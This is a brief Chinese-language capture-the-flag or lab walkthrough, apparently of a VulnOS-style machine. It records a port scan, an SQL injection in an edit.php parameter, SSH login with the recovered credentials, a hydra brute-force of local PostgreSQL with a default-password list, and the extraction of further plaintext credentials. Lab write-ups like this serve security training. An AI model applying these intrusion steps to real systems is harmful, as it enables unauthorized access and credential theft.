## 端口

```
22
80
6667

中间件
Apache 2.4.7 ubuntu
```

## sql注入

在http://192.168.56.104/jabcd0cs/edit.php?id=9&state=2发现sql注入得到admin账号密码

```
webmin
webmin1980
```

然后ssh连接

发现postgres服务。利用/usr/share/wordlists/legion/postgres-betterdefaultpasslist.txt

```
hydra -C postgres-betterdefaultpasslist.txt postgres://127.0.0.1
```

得到postgres登录账号密码

```
postgres|postgres
```

```
psql -h 127.0.0.1 -U postgres
```

得到用户信息

```
vulnosadmin | c4nuh4ckm3tw1c3
```

登录vulnosadmin，发现r00t.blend这是个3D文件，使用blender打开发现字符串

```
ab12fg//drg
```

